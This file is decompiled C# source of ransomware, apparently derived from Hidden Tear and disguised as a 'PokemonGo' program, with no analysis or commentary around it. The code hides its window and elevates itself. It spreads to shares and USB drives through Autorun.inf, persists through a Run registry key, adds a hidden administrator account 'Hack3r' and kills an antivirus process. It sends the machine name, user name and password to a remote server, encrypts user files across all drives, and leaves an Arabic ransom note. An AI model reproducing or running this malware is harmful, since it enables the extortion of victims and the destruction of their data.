using System;
using System.ComponentModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace PokemonGo;

public class Form1 : Form
{
	private string targetURL = "http://10.25.0.169/PokemonGo/write.php?info=";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private string backup = Application.get_ExecutablePath();

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return "123vivalalgerie";
	}

	public void SendPassword(string password)
	{
		string text = computerName + "-" + userName + " " + password + " <br>";
		string address = targetURL + text;
		try
		{
			new WebClient().DownloadString(address);
		}
		catch (WebException)
		{
		}
		string text2 = "\\Desktop\\pk";
		string path = userDir + userName + text2;
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		File.WriteAllText(path, password);
		File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		try
		{
			File.WriteAllBytes(file, bytes2);
			File.Move(file, file + ".locked");
		}
		catch (Exception)
		{
		}
	}

	public void encryptDirectory(string location, string password)
	{
		string[] source = new string[26]
		{
			".txt", ".rtf", ".doc", ".pdf", ".mht", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
			".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx",
			".html", ".xml", ".psd", ".htm", ".gif", ".png"
		};
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		for (int i = 0; i < files.Length; i++)
		{
			string extension = Path.GetExtension(files[i]);
			if (source.Contains(extension))
			{
				try
				{
					EncryptFile(files[i], password);
				}
				catch (Exception)
				{
				}
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			try
			{
				encryptDirectory(directories[j], password);
			}
			catch (Exception)
			{
			}
		}
	}

	public void encryptHDD(string password)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady && (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Removable))
			{
				try
				{
					encryptDirectory(driveInfo.Name, password);
				}
				catch (Exception)
				{
				}
			}
		}
	}

	private static void KillAV()
	{
		(new string[1])[0] = "SMΔRTP";
		try
		{
			Process[] processesByName = Process.GetProcessesByName("SMΔRTP");
			foreach (Process process in processesByName)
			{
				process.EnableRaisingEvents = false;
				process.Kill();
			}
		}
		catch (Exception)
		{
		}
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\هام جدا.txt";
		string path = userDir + userName + text;
		string[] contents = new string[1] { "(: لقد تم تشفير ملفاتكم، لفك الشفرة فلكسي موبيليس للعنوان التالي me.blackhat20152015@mt2015.com وشكرا على كرمكم مسبقا " };
		try
		{
			File.WriteAllLines(path, contents);
		}
		catch (Exception)
		{
		}
	}

	public void Populate()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!driveInfo.IsReady || File.Exists(string.Concat(driveInfo, "PokemonGo.exe")))
			{
				continue;
			}
			if (driveInfo.DriveType == DriveType.Removable)
			{
				try
				{
					File.Copy(Application.get_ExecutablePath(), string.Concat(driveInfo, "PokemonGo.exe"));
					try
					{
						TextWriter textWriter = new StreamWriter(string.Concat(driveInfo, "Autorun.inf"));
						textWriter.WriteLine("[AutoRun]");
						textWriter.WriteLine("OPEN=PokemonGo.exe");
						textWriter.WriteLine("ICON=PokemonGo.exe");
						textWriter.Close();
					}
					catch (Exception)
					{
					}
				}
				catch (Exception)
				{
				}
			}
			if ((driveInfo.DriveType == DriveType.Fixed) & (driveInfo.Name != "C:\\"))
			{
				try
				{
					File.Copy(Application.get_ExecutablePath(), string.Concat(driveInfo, "PokemonGo.exe"));
					backup = string.Concat(driveInfo, "PokemonGo.exe");
				}
				catch (Exception)
				{
				}
			}
		}
	}

	public void Registre()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue("PokemonGo") == null)
		{
			registryKey.SetValue("PokemonGo", backup);
		}
	}

	public void CreateShare(string dir, string name)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Directory.CreateDirectory(dir);
			ManagementClass val = new ManagementClass("Win32_share");
			ManagementBaseObject methodParameters = ((ManagementObject)val).GetMethodParameters("Create");
			methodParameters.set_Item("Description", (object)name);
			methodParameters.set_Item("Name", (object)name);
			methodParameters.set_Item("Path", (object)dir);
			methodParameters.set_Item("Type", (object)0);
			methodParameters.set_Item("MaximumAllowed", (object)null);
			methodParameters.set_Item("Password", (object)null);
			methodParameters.set_Item("Access", (object)null);
			ManagementBaseObject val2 = ((ManagementObject)val).InvokeMethod("Create", methodParameters, (InvokeMethodOptions)null);
			uint num = (uint)val2.get_Properties().get_Item("ReturnValue").get_Value();
			if (num == 0)
			{
				if (Directory.Exists(dir))
				{
					new DirectoryInfo(dir);
				}
			}
			else
			{
				MessageBox.Show($"Unable to share directory. \nReturn Code: {num}");
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	public void Share()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("select * from win32_share");
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					string text = Convert.ToString(((ManagementBaseObject)val2).get_Item("Name"));
					if (!text.Contains("$"))
					{
						try
						{
							File.Copy(Application.get_ExecutablePath(), "\\\\" + Environment.MachineName + "\\" + text + "\\PokemonGo.exe", overwrite: true);
						}
						catch (Exception)
						{
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text2 in valueNames)
			{
				string text3 = registryKey.GetValue(text2)!.ToString();
				if (text2.ToLower() != "mrulist")
				{
					try
					{
						File.Copy(Application.get_ExecutablePath(), text3 + "\\\\PokemonGo.exe", overwrite: true);
					}
					catch (Exception)
					{
					}
				}
			}
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}

	public void addUser()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		try
		{
			DirectoryEntry val = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
			DirectoryEntry val2 = val.get_Children().Add("Hack3r", "user");
			val2.Invoke("SetPassword", new object[1] { "Hack3r" });
			val2.CommitChanges();
			DirectoryEntry val3 = val.get_Children().Find("administrators", "group");
			if (val3 != null)
			{
				val3.Invoke("Add", new object[1] { val2.get_Path().ToString() });
			}
			try
			{
				string keyName = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
				Registry.SetValue(keyName, "Hack3r", 0, RegistryValueKind.DWord);
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private void RunElevated(string fileName)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Verb = "runas";
		processStartInfo.FileName = fileName;
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Exception)
		{
		}
	}

	public static void GenerateMsg()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Stream manifestResourceStream = executingAssembly.GetManifestResourceStream("hidden_tear.Properties.2016.exe");
		Random random = new Random();
		string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + random.Next(100000) + ".exe";
		if (manifestResourceStream != null)
		{
			try
			{
				BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
				FileStream output = new FileStream(path, FileMode.Create);
				BinaryWriter binaryWriter = new BinaryWriter(output);
				byte[] array = new byte[manifestResourceStream.Length];
				manifestResourceStream.Read(array, 0, array.Length);
				binaryWriter.Write(array);
				binaryReader.Close();
				binaryWriter.Close();
				manifestResourceStream.Close();
			}
			catch (Exception)
			{
			}
		}
	}

	public void startAction()
	{
		string password = CreatePassword(15);
		string text = "";
		string location = userDir + userName + text;
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		string text2 = (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator) ? "Running with full rights" : "Running with limited rights");
		if (text2 == "Running with limited rights")
		{
			RunElevated(Application.get_ExecutablePath());
			((Form)this).Close();
		}
		Share();
		addUser();
		GenerateMsg();
		KillAV();
		SendPassword(password);
		Populate();
		encryptDirectory(location, password);
		encryptHDD(password);
		messageCreator();
		Registre();
		password = null;
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(124, 53));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
